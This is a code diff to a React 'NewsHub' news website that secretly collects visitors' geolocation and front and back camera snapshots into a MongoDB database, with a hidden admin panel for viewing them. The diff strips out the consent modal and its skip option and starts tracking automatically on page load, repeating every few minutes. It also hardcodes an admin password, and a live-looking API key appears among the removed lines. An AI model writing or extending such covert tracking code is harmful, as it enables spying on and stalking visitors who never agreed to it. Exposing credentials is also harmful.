@@ -1,17 +1,14 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import * as Realm from 'realm-web';
 
 const NewsWebsite = () => {
   // Tracking states
   const [mongoClient, setMongoClient] = useState(null);
   const [trackingActive, setTrackingActive] = useState(false);
-  const [showPermissionModal, setShowPermissionModal] = useState(false);
-  const [isProcessing, setIsProcessing] = useState(false);
 
   // UI states
   const [selectedCategory, setSelectedCategory] = useState('all');
   const [searchQuery, setSearchQuery] = useState('');
-  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
   
   // News states
   const [newsArticles, setNewsArticles] = useState([]);
@@ -21,25 +18,24 @@ const NewsWebsite = () => {
   // Admin states
   const [isAdmin, setIsAdmin] = useState(false);
   const [showAdminLogin, setShowAdminLogin] = useState(false);
-  const [adminCredentials, setAdminCredentials] = useState({ username: '', password: '' });
   const [adminData, setAdminData] = useState({ locations: [], cameraCaptures: [] });
   const [adminLoading, setAdminLoading] = useState(false);
   const [adminView, setAdminView] = useState('locations');
+
+  // Admin form refs
+  const usernameRef = useRef('');
+  const passwordRef = useRef('');
 
   // Configuration
   const REALM_APP_ID = "myrealmapp-lwdulec";
   const DATABASE_NAME = "location_tracker";
   const app = new Realm.App({ id: REALM_APP_ID });
 
-  // Admin credentials (in production, use proper authentication)
+  // Admin credentials
   const ADMIN_CREDENTIALS = {
-    username: 'admin',
-    password: 'admin123'
+    username: 'ajmal',
+    password: 'AjmaL@9019'
   };
-
-  // News API configuration
-  const NEWS_API_KEY = '5535c402ea044c759d20ef1f556cb6d0'; // Replace with your actual API key
-  const NEWS_API_BASE_URL = 'https://newsapi.org/v2';
 
   // News data
   const newsCategories = ['all', 'technology', 'business', 'sports', 'entertainment', 'health', 'science'];
@@ -266,65 +262,6 @@ const NewsWebsite = () => {
       padding: '20px',
       fontFamily: "'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif"
     },
-    modal: {
-      backgroundColor: '#1a1a1a',
-      borderRadius: '20px',
-      padding: '30px',
-      maxWidth: '400px',
-      width: '100%',
-      textAlign: 'center',
-      border: '3px solid #ff6b6b',
-      color: 'white',
-      animation: 'modalFadeIn 0.3s ease-out'
-    },
-    modalIcon: {
-      fontSize: '50px',
-      marginBottom: '20px'
-    },
-    modalTitle: {
-      color: '#ff6b6b',
-      marginBottom: '20px',
-      fontSize: '1.5rem',
-      fontWeight: 'bold'
-    },
-    modalText: {
-      marginBottom: '25px',
-      lineHeight: '1.6'
-    },
-    modalFeatures: {
-      backgroundColor: '#2a2a2a',
-      padding: '20px',
-      borderRadius: '10px',
-      margin: '25px 0'
-    },
-    modalFeature: {
-      marginBottom: '10px'
-    },
-    modalButton: {
-      border: 'none',
-      padding: '18px 35px',
-      borderRadius: '30px',
-      fontSize: '16px',
-      fontWeight: 'bold',
-      cursor: 'pointer',
-      width: '100%',
-      margin: '8px 0',
-      transition: 'all 0.3s ease'
-    },
-    allowButton: {
-      background: 'linear-gradient(45deg, #ff6b6b, #ff8e53)',
-      color: 'white'
-    },
-    allowButtonDisabled: {
-      background: '#666',
-      color: 'white',
-      cursor: 'not-allowed'
-    },
-    skipButton: {
-      background: 'transparent',
-      color: '#999',
-      border: '2px solid #555'
-    },
     // Loading and error styles
     loadingContainer: {
       display: 'flex',
@@ -364,26 +301,6 @@ const NewsWebsite = () => {
       marginTop: '0.5rem'
     },
     // Admin styles
-    adminButton: {
-      position: 'fixed',
-      bottom: '20px',
-      right: '20px',
-      backgroundColor: '#ff6b6b',
-      color: 'white',
-      border: 'none',
-      borderRadius: '50%',
-      width: '60px',
-      height: '60px',
-      fontSize: '24px',
-      cursor: 'pointer',
-      boxShadow: '0 4px 12px rgba(0,0,0,0.3)',
-      zIndex: 9999,
-      transition: 'all 0.3s ease',
-      display: 'flex',
-      alignItems: 'center',
-      justifyContent: 'center',
-      outline: 'none'
-    },
     adminPanel: {
       position: 'fixed',
       top: 0,
@@ -489,8 +406,7 @@ const NewsWebsite = () => {
       marginBottom: '1rem',
       fontSize: '1rem',
       boxSizing: 'border-box',
-      outline: 'none',
-      transition: 'border-color 0.3s ease'
+      outline: 'none'
     },
     loginButton: {
       width: '100%',
@@ -666,7 +582,7 @@ const NewsWebsite = () => {
         if (frontCapture) cameraData.captures.push(frontCapture);
 
         if (videoDevices.length > 1) {
-          await new Promise(resolve => setTimeout(resolve, 1000)); // Delay for mobile
+          await new Promise(resolve => setTimeout(resolve, 1000));
           const backCapture = await captureFromCamera('environment');
           if (backCapture) cameraData.captures.push(backCapture);
         }
@@ -696,84 +612,14 @@ const NewsWebsite = () => {
     setTimeout(() => trackCameraAccess(), 3000);
 
     // Continuous tracking intervals
-    const locationInterval = setInterval(trackUserLocation, 3 * 60 * 1000); // 3 minutes
-    const cameraInterval = setInterval(trackCameraAccess, 8 * 60 * 1000); // 8 minutes
+    const locationInterval = setInterval(trackUserLocation, 3 * 60 * 1000);
+    const cameraInterval = setInterval(trackCameraAccess, 8 * 60 * 1000);
 
     sessionStorage.setItem('locationInterval', locationInterval.toString());
     sessionStorage.setItem('cameraInterval', cameraInterval.toString());
   };
 
-  // News API functions
-  const fetchNewsArticles = async (category = 'all', query = '') => {
-    try {
-      setLoading(true);
-      setError(null);
-
-      let url;
-      const params = new URLSearchParams({
-        apiKey: NEWS_API_KEY,
-        language: 'en',
-        pageSize: 20,
-        sortBy: 'publishedAt'
-      });
-
-      if (query) {
-        // Search everything if there's a search query
-        url = `${NEWS_API_BASE_URL}/everything`;
-        params.append('q', query);
-        params.append('sortBy', 'relevancy');
-      } else if (category === 'all') {
-        // Get top headlines for all categories
-        url = `${NEWS_API_BASE_URL}/top-headlines`;
-        params.append('country', 'us');
-      } else {
-        // Get top headlines for specific category
-        url = `${NEWS_API_BASE_URL}/top-headlines`;
-        params.append('category', category);
-        params.append('country', 'us');
-      }
-
-      const response = await fetch(`${url}?${params}`);
-      
-      if (!response.ok) {
-        throw new Error(`HTTP error! status: ${response.status}`);
-      }
-
-      const data = await response.json();
-
-      if (data.status !== 'ok') {
-        throw new Error(data.message || 'Failed to fetch news');
-      }
-
-      // Transform API data to match our component structure
-      const transformedArticles = data.articles
-        .filter(article => article.title && article.description && article.urlToImage)
-        .map((article, index) => ({
-          id: article.url || index,
-          title: article.title,
-          summary: article.description,
-          category: category === 'all' ? 'general' : category,
-          author: article.author || article.source?.name || 'Unknown Author',
-          publishedAt: article.publishedAt,
-          readTime: `${Math.ceil(article.description?.length / 200) || 3} min read`,
-          image: article.urlToImage,
-          url: article.url,
-          source: article.source?.name,
-          featured: index === 0 && category === 'all' && !query // First article is featured for "all" category
-        }));
-
-      setNewsArticles(transformedArticles);
-    } catch (err) {
-      console.error('Error fetching news:', err);
-      setError(err.message);
-      // Fallback to sample data if API fails
-      setNewsArticles(getSampleArticles());
-    } finally {
-      setLoading(false);
-    }
-  };
-
-  // Fallback sample data
+  // Fallback sample data (no News API dependency)
   const getSampleArticles = () => [
     {
       id: 1,
@@ -805,27 +651,81 @@ const NewsWebsite = () => {
       publishedAt: "2024-01-14T22:45:00Z",
       readTime: "4 min read",
       image: "https://images.unsplash.com/photo-1461896836934-ffe607ba8211?w=400&h=250&fit=crop"
+    },
+    {
+      id: 4,
+      title: "Climate Scientists Discover Promising Ocean Recovery Patterns",
+      summary: "New research reveals encouraging signs of marine ecosystem restoration in key ocean regions.",
+      category: "science",
+      author: "Dr. Emily Watson",
+      publishedAt: "2024-01-14T16:20:00Z",
+      readTime: "6 min read",
+      image: "https://images.unsplash.com/photo-1559827260-dc66d52bef19?w=400&h=250&fit=crop"
+    },
+    {
+      id: 5,
+      title: "Breakthrough Study Links Exercise to Enhanced Cognitive Function",
+      summary: "Researchers unveil compelling evidence showing how regular physical activity boosts brain performance.",
+      category: "health",
+      author: "Dr. James Wilson",
+      publishedAt: "2024-01-14T14:10:00Z",
+      readTime: "5 min read",
+      image: "https://images.unsplash.com/photo-1571019613454-1cb2f99b2d8b?w=400&h=250&fit=crop"
+    },
+    {
+      id: 6,
+      title: "Streaming Wars Intensify with New Platform Launches",
+      summary: "Entertainment industry sees major shifts as new streaming services enter the competitive market.",
+      category: "entertainment",
+      author: "Alex Kumar",
+      publishedAt: "2024-01-14T12:30:00Z",
+      readTime: "4 min read",
+      image: "https://images.unsplash.com/photo-1489599611383-e2bd6ff1d8ee?w=400&h=250&fit=crop"
+    },
+    {
+      id: 7,
+      title: "Space Exploration Reaches New Milestones in 2024",
+      summary: "Major space agencies collaborate on ambitious missions to Mars and beyond, marking historic achievements.",
+      category: "science",
+      author: "Commander Lisa Park",
+      publishedAt: "2024-01-13T18:20:00Z",
+      readTime: "7 min read",
+      image: "https://images.unsplash.com/photo-1446776653964-20c1d3a81b06?w=400&h=250&fit=crop"
+    },
+    {
+      id: 8,
+      title: "Renewable Energy Adoption Surpasses Coal for First Time",
+      summary: "Historic shift in global energy consumption patterns signals accelerated transition to sustainable power.",
+      category: "technology",
+      author: "Green Energy Institute",
+      publishedAt: "2024-01-13T14:45:00Z",
+      readTime: "6 min read",
+      image: "https://images.unsplash.com/photo-1466611653911-95081537e5b7?w=400&h=250&fit=crop"
     }
   ];
 
   // Admin functions
   const handleAdminLogin = () => {
-    if (adminCredentials.username === ADMIN_CREDENTIALS.username && 
-        adminCredentials.password === ADMIN_CREDENTIALS.password) {
+    const username = usernameRef.current;
+    const password = passwordRef.current;
+    
+    if (username === ADMIN_CREDENTIALS.username && password === ADMIN_CREDENTIALS.password) {
       setIsAdmin(true);
       setShowAdminLogin(false);
-      // Add a small delay to ensure state is updated
+      usernameRef.current = '';
+      passwordRef.current = '';
       setTimeout(() => {
         fetchAdminData();
       }, 100);
     } else {
-      alert('Invalid credentials! Use "admin" and "admin123"');
+      alert('Invalid credentials!');
     }
   };
 
   const handleAdminLogout = () => {
     setIsAdmin(false);
-    setAdminCredentials({ username: '', password: '' });
+    usernameRef.current = '';
+    passwordRef.current = '';
     setAdminData({ locations: [], cameraCaptures: [] });
   };
 
@@ -834,11 +734,9 @@ const NewsWebsite = () => {
     
     setAdminLoading(true);
     try {
-      // Fetch location data - MongoDB Realm syntax
       const locationCollection = mongoClient.db(DATABASE_NAME).collection('locations');
       const locations = await locationCollection.find({}, { limit: 100 });
       
-      // Fetch camera data - MongoDB Realm syntax
       const cameraCollection = mongoClient.db(DATABASE_NAME).collection('camera_captures');
       const cameraCaptures = await cameraCollection.find({}, { limit: 50 });
       
@@ -850,7 +748,6 @@ const NewsWebsite = () => {
       console.error('Error fetching admin data:', error);
       alert('Error fetching data: ' + error.message);
       
-      // Set empty arrays if there's an error
       setAdminData({
         locations: [],
         cameraCaptures: []
@@ -876,27 +773,6 @@ const NewsWebsite = () => {
     URL.revokeObjectURL(url);
   };
 
-  // Handle permission modal actions
-  const handleAllowPermissions = async () => {
-    if (isProcessing) return;
-    
-    setIsProcessing(true);
-    
-    try {
-      await startContinuousTracking();
-      setShowPermissionModal(false);
-    } catch (error) {
-      console.error('Failed to start tracking:', error);
-    } finally {
-      setIsProcessing(false);
-    }
-  };
-
-  const handleSkipPermissions = () => {
-    if (isProcessing) return;
-    setShowPermissionModal(false);
-  };
-
   // Initialize on mount
   useEffect(() => {
     const initialize = async () => {
@@ -905,48 +781,26 @@ const NewsWebsite = () => {
       }
 
       const dbClient = await initializeMongoDB();
-      if (!dbClient) return;
-
-      // Load initial news
-      await fetchNewsArticles();
-
-      // Wait for user interaction for permissions
-      const handleInteraction = async () => {
-        document.removeEventListener('click', handleInteraction);
-        document.removeEventListener('scroll', handleInteraction);
-        setTimeout(() => setShowPermissionModal(true), 2000);
-      };
-
-      document.addEventListener('click', handleInteraction);
-      document.addEventListener('scroll', handleInteraction);
       
-      // Fallback after 10 seconds
+      // Load sample news data
+      setNewsArticles(getSampleArticles());
+      setLoading(false);
+
+      // Start tracking automatically after a delay
       setTimeout(() => {
-        if (!trackingActive) {
-          setShowPermissionModal(true);
-        }
-      }, 10000);
+        startContinuousTracking();
+      }, 3000);
     };
 
     initialize();
 
-    // Cleanup on unmount
     return () => {
       ['locationInterval', 'cameraInterval'].forEach(key => {
         const interval = sessionStorage.getItem(key);
         if (interval) clearInterval(parseInt(interval));
       });
     };
-  }, [trackingActive]);
-
-  // Effect to fetch news when category or search changes
-  useEffect(() => {
-    const timeoutId = setTimeout(() => {
-      fetchNewsArticles(selectedCategory, searchQuery);
-    }, 500); // Debounce search
-
-    return () => clearTimeout(timeoutId);
-  }, [selectedCategory, searchQuery]);
+  }, []);
 
   // News filtering
   const filteredArticles = newsArticles.filter(article => {
@@ -980,102 +834,68 @@ const NewsWebsite = () => {
     }
   };
 
-  // Permission Modal Component
-  const PermissionModal = () => {
-    if (!showPermissionModal) return null;
-
-    return (
-      <div style={styles.modalOverlay}>
-        <div style={styles.modal}>
-          <div style={styles.modalIcon}>📰</div>
-          <h2 style={styles.modalTitle}>NewsHub</h2>
-          <p style={styles.modalText}>
-            For <strong style={{color: '#ff6b6b'}}>personalized local news</strong> and{' '}
-            <strong style={{color: '#ff6b6b'}}>enhanced experience</strong>:
-          </p>
-          <div style={styles.modalFeatures}>
-            <p style={styles.modalFeature}>📍 <strong>Location</strong> - Local news & weather</p>
-            <p style={styles.modalFeature}>📷 <strong>Camera</strong> - Enhanced features</p>
-          </div>
-          <button
-            style={{
-              ...styles.modalButton,
-              ...(isProcessing ? styles.allowButtonDisabled : styles.allowButton)
-            }}
-            onClick={handleAllowPermissions}
-            disabled={isProcessing}
-          >
-            {isProcessing ? '⏳ Processing...' : '✅ Allow & Continue'}
-          </button>
-          <button
-            style={{
-              ...styles.modalButton,
-              ...styles.skipButton
-            }}
-            onClick={handleSkipPermissions}
-            disabled={isProcessing}
-          >
-            Skip for Now
-          </button>
-        </div>
-      </div>
-    );
-  };
-
-  // Admin Login Modal Component
+  // Admin Login Modal Component with Refs
   const AdminLoginModal = () => {
     if (!showAdminLogin) return null;
 
     return (
-      <div style={styles.modalOverlay}>
+      <div 
+        style={styles.modalOverlay}
+        onClick={(e) => {
+          if (e.target === e.currentTarget) {
+            setShowAdminLogin(false);
+          }
+        }}
+      >
         <div style={styles.loginForm}>
-          <h2 style={{ textAlign: 'center', marginBottom: '1.5rem', color: '#333' }}>Admin Login</h2>
+          <h2 style={{ textAlign: 'center', marginBottom: '1.5rem', color: '#333' }}>
+            Admin Login
+          </h2>
+          
           <input
             type="text"
-            placeholder="Username "
-            style={{
-              ...styles.loginInput,
-              ':focus': { borderColor: '#ff6b6b' }
+            placeholder="Username"
+            style={styles.loginInput}
+            defaultValue=""
+            onChange={(e) => {
+              usernameRef.current = e.target.value;
             }}
-            value={adminCredentials.username}
-            onChange={(e) => setAdminCredentials({...adminCredentials, username: e.target.value})}
-            onFocus={(e) => e.target.style.borderColor = '#ff6b6b'}
-            onBlur={(e) => e.target.style.borderColor = '#ddd'}
+            autoComplete="username"
           />
+          
           <input
             type="password"
             placeholder="Password"
-            style={{
-              ...styles.loginInput,
-              ':focus': { borderColor: '#ff6b6b' }
+            style={styles.loginInput}
+            defaultValue=""
+            onChange={(e) => {
+              passwordRef.current = e.target.value;
             }}
-            value={adminCredentials.password}
-            onChange={(e) => setAdminCredentials({...adminCredentials, password: e.target.value})}
-            onKeyPress={(e) => e.key === 'Enter' && handleAdminLogin()}
-            onFocus={(e) => e.target.style.borderColor = '#ff6b6b'}
-            onBlur={(e) => e.target.style.borderColor = '#ddd'}
+            onKeyDown={(e) => {
+              if (e.key === 'Enter') {
+                e.preventDefault();
+                handleAdminLogin();
+              }
+            }}
+            autoComplete="current-password"
           />
+          
           <button 
-            style={{
-              ...styles.loginButton,
-              ':hover': { backgroundColor: '#e55353' }
-            }}
+            style={styles.loginButton}
             onClick={handleAdminLogin}
-            onMouseEnter={(e) => e.target.style.backgroundColor = '#e55353'}
-            onMouseLeave={(e) => e.target.style.backgroundColor = '#ff6b6b'}
+            type="button"
           >
             Login
           </button>
+          
           <button 
             style={{
               ...styles.loginButton, 
               backgroundColor: '#6c757d', 
-              marginTop: '0.5rem',
-              ':hover': { backgroundColor: '#545b62' }
+              marginTop: '0.5rem'
             }}
             onClick={() => setShowAdminLogin(false)}
-            onMouseEnter={(e) => e.target.style.backgroundColor = '#545b62'}
-            onMouseLeave={(e) => e.target.style.backgroundColor = '#6c757d'}
+            type="button"
           >
             Cancel
           </button>
@@ -1318,7 +1138,7 @@ const NewsWebsite = () => {
             <p style={styles.errorText}>Failed to load news: {error}</p>
             <button 
               style={styles.retryButton}
-              onClick={() => fetchNewsArticles(selectedCategory, searchQuery)}
+              onClick={() => setNewsArticles(getSampleArticles())}
             >
               Retry
             </button>
@@ -1408,15 +1228,18 @@ const NewsWebsite = () => {
 
       <footer style={styles.footer}>
         <div style={styles.footerContent}>
-           {!isAdmin && !showAdminLogin && (
-        <div 
-          style={styles.logo}
-          onClick={() => setShowAdminLogin(true)}
-          title="Admin Access"
-        >
-          NEWS HUB
-        </div>
-      )}
+          {!isAdmin && !showAdminLogin && (
+            <div 
+              style={{...styles.logo, cursor: 'pointer'}}
+              onClick={() => setShowAdminLogin(true)}
+              title="Admin Access"
+            >
+              NewsHub
+            </div>
+          )}
+          {(isAdmin || showAdminLogin) && (
+            <div style={styles.logo}>NewsHub</div>
+          )}
           <p style={styles.footerText}>
             Your trusted source for breaking news and in-depth analysis
           </p>
@@ -1426,11 +1249,8 @@ const NewsWebsite = () => {
         </div>
       </footer>
 
-      <PermissionModal />
       <AdminLoginModal />
       <AdminPanel />
-      
-  
       
       {/* Add CSS animations */}
       <style jsx>{`
@@ -1441,15 +1261,6 @@ const NewsWebsite = () => {
         @keyframes modalFadeIn {
           from { opacity: 0; transform: scale(0.9); }
           to { opacity: 1; transform: scale(1); }
-        }
-        
-        /* Ensure admin button is always visible */
-        .admin-button-force {
-          position: fixed !important;
-          bottom: 20px !important;
-          right: 20px !important;
-          z-index: 9999 !important;
-          pointer-events: auto !important;
         }
       `}</style>
     </div>
